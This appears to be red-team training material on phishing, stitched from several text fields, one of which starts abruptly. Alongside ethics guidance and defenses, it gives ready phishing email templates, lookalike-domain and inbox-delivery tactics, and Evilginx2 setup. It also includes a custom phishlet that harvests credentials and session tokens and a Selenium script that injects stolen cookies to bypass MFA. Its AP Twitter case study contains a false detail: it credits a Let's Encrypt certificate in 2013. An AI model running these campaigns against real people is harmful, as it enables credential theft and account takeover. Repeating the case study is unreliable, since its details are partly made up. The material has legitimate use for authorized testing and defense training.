        "text": "# Advanced Phishing and Social Engineering for Red Teams\n\nSocial engineering remains one of the most effective attack vectors in cybersecurity. While technical defenses have improved dramatically, humans remain the weakest link. As a red teamer, understanding sophisticated phishing and social engineering techniques is essential for testing organizational resilience.\n\n## Why Phishing Still Works\n\nDespite years of security awareness training, phishing succeeds because:\n\n**1. Human Psychology**: Exploitation of trust, authority, urgency, curiosity\n**2. Sophistication**: Modern phishing is highly targeted and personalized\n**3. Volume**: Attackers only need one success out of thousands of attempts\n**4. Evolving Techniques**: Bypassing 2FA with MitM proxies (Evilginx2)\n**5. Legitimate Infrastructure**: Using real cloud services (AWS, Azure) for hosting\n\n## Statistics\n\n- **90%** of breaches start with phishing (Verizon DBIR)\n- **65%** of organizations experienced successful phishing attacks (2023)\n- **Average click rate**: 15-30% in untrained organizations\n- **Average compromise rate**: 5-10% (credentials entered)\n- **Time to first click**: Often < 5 minutes after email sent\n\n## Red Team Phishing vs. Criminal Phishing\n\n**Red Team (Authorized):**\n- Explicit permission via Rules of Engagement (RoE)\n- Goal: Test and improve defenses\n- Report findings to improve security posture\n- Ethical handling of sensitive data\n- Stop immediately if RoE violated\n\n**Criminal (Unauthorized):**\n- No permission\n- Goal: Financial gain, espionage, destruction\n- Exploits victims for profit\n- Illegal and unethical\n\n**This lesson focuses exclusively on authorized red team operations.**"

        "text": "**Mindset: The Ethics of Social Engineering**\n\nPhishing and social engineering can feel uncomfortable—you're essentially tricking people. Here's the right mindset:\n\n**You're Not the Bad Guy**\n\nYou're testing defenses in a controlled environment to find weaknesses before real attackers do. Your work:\n- Protects organizations from actual criminals\n- Improves security awareness training\n- Identifies systemic security gaps\n- Helps people recognize threats\n\n**The Golden Rules:**\n\n1. **Always have authorization**: Written RoE signed by appropriate authority\n2. **Stay in scope**: Don't target individuals not covered by RoE\n3. **Handle data responsibly**: Encrypt harvested credentials, delete after reporting\n4. **Be professional**: Don't shame or embarrass individuals in reports\n5. **Focus on systemic issues**: Report organizational gaps, not individual failures\n6. **Educate, don't punish**: The goal is improvement, not blame\n\n**Remember**: Real attackers have no rules. By testing these techniques ethically, you're making organizations safer. That's noble work.\n\n**Respect Privacy**: Just because you can access personal information doesn't mean you should include it in reports. Report what's necessary, protect what's personal."

        "text": "# Phishing Campaign Methodology\n\n## Phase 1: Reconnaissance\n\n**Gather Intelligence:**\n\n```bash\n# 1. Company structure\n- Org chart (LinkedIn, company website)\n- Department names and functions\n- Recent news/press releases\n- Technologies used (job postings reveal this)\n\n# 2. Target identification\n- Key personnel (executives, IT admins, finance)\n- Email format (firstname.lastname@company.com)\n- Phone extensions\n- Social media profiles\n\n# 3. Technical reconnaissance\n- Email security controls (SPF/DKIM/DMARC records)\n- Mail server fingerprinting\n- Corporate IP ranges\n- VPN/remote access portals\n```\n\n**OSINT Tools:**\n\n```bash\n# Email harvesting\ntheHarvester -d company.com -b all\n\n# LinkedIn enumeration\npython3 linkedin2username.py company -d 10\n\n# Email format detection\nemail-enum -d company.com\n\n# Check email security\ndig TXT company.com | grep spf\ndig TXT _dmarc.company.com\n\n# Discover technologies\nwhatWeb https://company.com\nwappalyzer company.com\n```\n\n## Phase 2: Pretext Development\n\nA **pretext** is your fabricated scenario. Effective pretexts:\n\n**Characteristics:**\n- Relevant to target's role\n- Creates urgency or curiosity\n- Appears from legitimate source\n- Requires minimal verification\n\n**Common Pretexts:**\n\n**1. IT Support**\n```\nSubject: [URGENT] Office 365 Password Expiration\n\nDear [Name],\n\nYour Office 365 password will expire in 24 hours. To prevent service interruption, please verify your account:\n\n[Phishing Link]\n\nIT Support Team\n```\n\n**Why it works**: People fear service disruption, IT requests seem legitimate\n\n**2. Executive Impersonation**\n```\nSubject: Re: Q4 Financial Report\n\nHi [Name],\n\nI need you to review this updated financial report before the board meeting this afternoon. It's in the shared folder:\n\n[Phishing Link]\n\nThanks,\n[CEO Name]\n\nSent from my iPhone\n```\n\n**Why it works**: Authority, urgency, appears from mobile (explains brevity)\n\n**3. Vendor/Partner**\n```\nSubject: Invoice #47829 - Payment Required\n\nHello,\n\nAttached is invoice #47829 for services rendered. Payment is due within 5 business days.\n\nPlease remit payment to the account details in the attached document.\n\n[Malicious Attachment]\n\nBest regards,\nAccounting Department\nTrustedVendor Inc.\n```\n\n**Why it works**: Finance teams expect invoices, document reviews seem normal\n\n**4. HR/Benefits**\n```\nSubject: Important: Benefits Enrollment Deadline Extended\n\nDear Team,\n\nDue to system issues, we've extended the benefits enrollment deadline to Friday. Please complete your enrollment:\n\n[Phishing Link]\n\nHR will be available for questions until 5 PM.\n\nHuman Resources\n```\n\n**Why it works**: Personal impact, familiar process, helpful tone\n\n## Phase 3: Infrastructure Setup\n\n**Domain Registration:**\n\n```\nLegitimate: company.com\nPhishing options:\n- Typosquatting: cornpany.com, compamy.com\n- Homographs: сompany.com (Cyrillic 'c')\n- Subdomain: secure-login.company-portal.com\n- TLD variation: company.co, company.net\n- Lookalike: company-secure.com\n```\n\n**Registrar Selection:**\n- Use Namecheap, Porkbun (accept crypto, privacy-friendly)\n- Enable WHOIS privacy\n- Use operational email, not personal\n\n**Hosting:**\n\n```bash\n# Options:\n1. VPS (DigitalOcean, Vultr, Linode)\n2. Cloud (AWS, Azure, GCP) - more legitimate IPs\n3. Cloudflare (hides real server IP)\n\n# Setup:\n- Deploy web server (Nginx/Apache)\n- Obtain SSL certificate (Let's Encrypt)\n- Configure email server (Postfix/SendGrid API)\n- Implement logging for tracking\n```\n\n**Email Authentication:**\n\n```bash\n# SPF Record (Sender Policy Framework)\n# Add to DNS:\nTXT @ \"v=spf1 ip4:YOUR_SERVER_IP include:_spf.google.com ~all\"\n\n# DKIM Record (DomainKeys Identified Mail)\n# Generate keys:\nopenssl genrsa -out dkim_private.pem 2048\nopenssl rsa -in dkim_private.pem -pubout -out dkim_public.pem\n\n# Add public key to DNS:\nTXT default._domainkey \"v=DKIM1; k=rsa; p=YOUR_PUBLIC_KEY\"\n\n# DMARC Record\nTXT _dmarc \"v=DMARC1; p=none; rua=mailto:dmarc@yourdomain.com\"\n```\n\nProper email authentication makes your phishing emails more likely to reach inboxes."

Victim clicks phishing link (points to Evilginx2)\n2. Evilginx2 proxies requests to real website (e.g., Gmail)\n3. Victim sees real Gmail login page (proxied through Evilginx2)\n4. Victim enters credentials + 2FA code\n5. Evilginx2 captures credentials AND session cookies\n6. Evilginx2 redirects victim to real site (they're logged in, no suspicion)\n7. Attacker uses stolen session cookies to bypass login entirely\n```\n\n## Installation\n\n```bash\n# Install Go\nwget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz\nsudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz\nexport PATH=$PATH:/usr/local/go/bin\n\n# Install Evilginx2\ngit clone https://github.com/kgretzky/evilginx2.git\ncd evilginx2\nmake\nsudo make install\n\n# Run\nsudo evilginx\n```\n\n## Configuration\n\n```bash\n# Inside Evilginx2 console\n\n# Set your domain\nconfig domain phish-domain.com\n\n# Set your server IP\nconfig ip YOUR_SERVER_IP\n\n# Enable phishlet (pre-built for popular services)\nphishlets hostname office365 login.phish-domain.com\nphishlets enable office365\n\n# Create lure (phishing link)\nlures create office365\nlures get-url 0\n# Returns: https://login.phish-domain.com/Ab12Cd34\n```\n\n## Built-in Phishlets\n\nEvilginx2 includes phishlets for:\n- Office 365\n- Google/Gmail\n- Facebook\n- LinkedIn\n- GitHub\n- AWS\n- Okta\n- Many more...\n\n## Custom Phishlet Creation\n\n```yaml\nname: 'custom-app'\nmin_ver: '3.0.0'\nproxy_hosts:\n  - {phish_sub: 'login', orig_sub: 'login', domain: 'targetapp.com', session: true, is_landing: true}\n  - {phish_sub: 'api', orig_sub: 'api', domain: 'targetapp.com', session: true, is_landing: false}\n\nsub_filters:\n  - {triggers_on: 'login.targetapp.com', orig_sub: 'login', domain: 'targetapp.com', search: 'targetapp.com', replace: '{domain}', mimes: ['text/html', 'application/json']}\n\nauth_tokens:\n  - domain: '.targetapp.com'\n    keys: ['session_token', 'auth_cookie']\n\ncredentials:\n  username:\n    key: 'username'\n    search: '(.*)'\n    type: 'post'\n  password:\n    key: 'password'\n    search: '(.*)'\n    type: 'post'\n\nlogin:\n  domain: 'targetapp.com'\n  path: '/login'\n```\n\n## Session Hijacking\n\nAfter capturing session cookies:\n\n```bash\n# View captured sessions\nsessions\n\n# Session output:\n[0] [office365] [john.doe@company.com]\n    Captured: 2025-01-15 14:23:45\n    Username: john.doe@company.com\n    Password: P@ssw0rd123!\n    Cookies: [34 cookies captured]\n\n# Export session\nsessions 0 export\n# Saves to: ~/.evilginx/sessions/0.json\n```\n\n**Using stolen session:**\n\n```python\n# Import cookies into browser\nimport json\nfrom selenium import webdriver\n\n# Load stolen cookies\nwith open('session_0.json') as f:\n    cookies = json.load(f)\n\ndriver = webdriver.Chrome()\ndriver.get('https://outlook.office365.com')\n\n# Inject cookies\nfor cookie in cookies:\n    driver.add_cookie(cookie)\n\n# Refresh - you're now logged in as victim (bypassing MFA)\ndriver.refresh()\n```\n\n## Defenses Against Evilginx2\n\n**For Organizations:**\n1. **FIDO2/WebAuthn**: Hardware keys (YubiKey) resist phishing\n2. **Conditional Access**: Check for unusual locations, devices\n3. **User training**: Recognize URL inconsistencies\n4. **Certificate Pinning**: Mobile apps can pin legitimate certificates\n\n**For Users:**\n1. **Check URL carefully**: login.microsoft.com vs login-microsoft.com\n2. **Use password managers**: Won't autofill on wrong domains\n3. **Hardware security keys**: Best protection against phishing\n4. **Be suspicious of unexpected logins**: Even if page looks real"

        "text": "# Case Study: The AP Twitter Hack (2013)\n\n## Background\n\nOn April 23, 2013, the **Associated Press (AP) Twitter account** was compromised via spear phishing. A single tweet caused:\n- **$136 billion** wiped from stock market in 3 minutes\n- Dow Jones dropped 143 points instantly\n- Demonstrated impact of social engineering on critical infrastructure\n\n## The Attack\n\n**Tweet Posted:**\n> \"Breaking: Two Explosions in the White House and Barack Obama is injured\"\n\nThe tweet was **false**, but markets reacted instantly before verification.\n\n## The Phishing Campaign\n\n**Phase 1: Reconnaissance**\n- Syrian Electronic Army (SEA) targeted multiple news organizations\n- Identified AP journalists and social media team\n- Gathered email addresses from public profiles\n\n**Phase 2: Spear Phishing**\n\nEmail sent to AP employees:\n\n```\nFrom: support@twitter-support.com  (Fake domain!)\nSubject: Your Twitter Account Has Been Suspended\n\nDear User,\n\nWe have detected suspicious activity on your Twitter account and have temporarily suspended it for your protection.\n\nTo restore your account, please verify your identity:\n\nhttps://twitter-security.com/verify\n\nFailure to verify within 24 hours will result in permanent suspension.\n\nTwitter Security Team\n```\n\n**Red Flags** (Not noticed by victims):\n1. Domain: twitter-support.com (not twitter.com)\n2. Generic greeting (\"Dear User\")\n3. Urgency and fear tactics\n4. Suspicious link domain\n\n**Phase 3: Credential Harvesting**\n\nThe phishing page:\n- Perfectly cloned Twitter login\n- Used HTTPS (Let's Encrypt certificate)\n- Captured username + password\n- Redirected to real Twitter after submission\n\n**Phase 4: Account Compromise**\n- Attackers logged into AP Twitter account\n- No 2FA enabled (this was 2013, before 2FA was common)\n- Posted false tweet\n- Deleted and logged out\n\n## Impact Analysis\n\n**Financial:**\n- $136B market cap loss (recovered in minutes)\n- High-frequency trading algorithms reacted to keywords\n- No human verification before automated trading\n\n**Reputational:**\n- AP's credibility questioned\n- Trust in social media as news source damaged\n- Demonstrated vulnerability of verification systems\n\n**Security:**\n- Wake-up call for media organizations\n- Led to widespread 2FA adoption\n- Increased scrutiny of social media account security\n\n## Lessons Learned\n\n**For Organizations:**\n\n1. **Enable 2FA**: Mandatory for all social media accounts\n2. **Verify unusual requests**: Call sender using known number\n3. **Email authentication**: Check sender domain carefully\n4. **Incident response plan**: Procedures for account compromise\n5. **Social media policy**: Who can post, approval processes\n\n**For Red Teams:**\n\n1. **Targeting high-value accounts**: Social media has real-world impact\n2. **Pretext realism**: Security warnings are effective pretexts\n3. **Domain similarity**: Typosquatting works\n4. **HTTPS doesn't mean safe**: Phishing sites can have valid certificates\n5. **Timing matters**: Attacks during busy news cycles more likely to succeed\n\n**For Defenders:**\n\n1. **DNS monitoring**: Alert on similar domain registrations\n2. **Link analysis tools**: Scan URLs before clicking\n3. **Browser indicators**: Train users to check address bar\n4. **Incident detection**: Monitor for unusual account activity\n5. **Content verification**: Multiple sources before publishing\n\n## Modern Mitigation\n\n**Twitter (now X) improvements since 2013:**\n- Mandatory 2FA for verified accounts\n- Account activity alerts\n- Login verification for new devices\n- Phishing detection in DMs\n- Verified organization badges\n\n**What Red Teams Should Test:**\n- Are 2FA bypass techniques effective? (Evilginx2)\n- Do users recognize phishing with HTTPS?\n- Are backup codes securely stored?\n- Does your SOC detect unusual social media activity?\n- What's the incident response time for compromised accounts?\n\n## Exercise\n\nDesign a red team exercise to test your organization's social media security:\n\n1. Create a phishing page targeting social media credentials\n2. Use similar pretext (account suspension, security alert)\n3. Include 2FA page (test if users enter it)\n4. Monitor which users fall for the phish\n5. Test incident response: How quickly is fake post detected and removed?\n6. Measure: Time to detection, escalation procedures, communication effectiveness\n\nRemember: Authorization first, ethics always."

        "text": "# Reflection and Best Practices\n\n## Key Takeaways\n\n1. **Phishing remains highly effective** despite years of training\n2. **Technology enables both attack and defense** (GoPhish, Evilginx2 vs. FIDO2, conditional access)\n3. **Ethics matter**: Red teaming helps organizations, not harms individuals\n4. **Pretexts require research**: Generic phishing is less effective than targeted campaigns\n5. **Email authentication helps**: Proper SPF/DKIM/DMARC improves deliverability\n\n## Red Team Phishing Checklist\n\n**Before Campaign:**\n- [ ] Rules of Engagement signed\n- [ ] Scope clearly defined (who can be targeted)\n- [ ] Infrastructure configured (domains, hosting, email)\n- [ ] Email authentication (SPF, DKIM, DMARC)\n- [ ] Landing pages tested\n- [ ] Logging configured\n- [ ] Data handling procedures documented\n\n**During Campaign:**\n- [ ] Monitor results in real-time\n- [ ] Stay within scope\n- [ ] Stop if RoE violated\n- [ ] Document unexpected findings\n\n**After Campaign:**\n- [ ] Take down infrastructure\n- [ ] Securely delete harvested data\n- [ ] Prepare report (focus on trends, not individuals)\n- [ ] Debrief with client\n- [ ] Offer training recommendations\n\n## Reporting Best Practices\n\n**Do:**\n- Report aggregate statistics (20% click rate, 5% submitted credentials)\n- Highlight departmental trends (Finance more susceptible to invoice scams)\n- Recommend specific training (MFA awareness, URL verification)\n- Provide timeline (first click within 5 minutes)\n\n**Don't:**\n- Name individuals who fell for phishing\n- Include embarrassing screenshots\n- Recommend punishment for victims\n- Share credentials in report (even encrypted)\n\n## Advanced Topics for Further Study\n\n1. **Vishing (Voice Phishing)**: Phone-based social engineering\n2. **Smishing (SMS Phishing)**: Text message attacks\n3. **Physical Security**: Tailgating, badge cloning, dumpster diving\n4. **OSINT Automation**: Using tools like Recon-ng, theHarvester\n5. **Adversary Simulation**: Emulating real threat groups (APT29, Lazarus)\n\n## Practice Exercises\n\n**Exercise 1**: Set up GoPhish in a lab environment\n- Create 3 different email templates\n- Build matching landing pages\n- Test with dummy accounts\n- Analyze tracking data\n\n**Exercise 2**: Analyze a real phishing email\n- Find phishing emails in spam folder\n- Examine headers (sender IP, mail server)\n- Check DNS records (SPF, DKIM, DMARC)\n- Analyze URL (typosquatting, redirects)\n- Screenshot and document findings\n\n**Exercise 3**: Design a pretext\n- Choose a target organization (fictional)\n- Research using OSINT\n- Develop 3 different pretexts\n- Justify why each might work\n- Identify red flags that might alert targets\n\n**Remember**: Practice on authorized systems only. Unauthorized phishing is illegal and unethical."
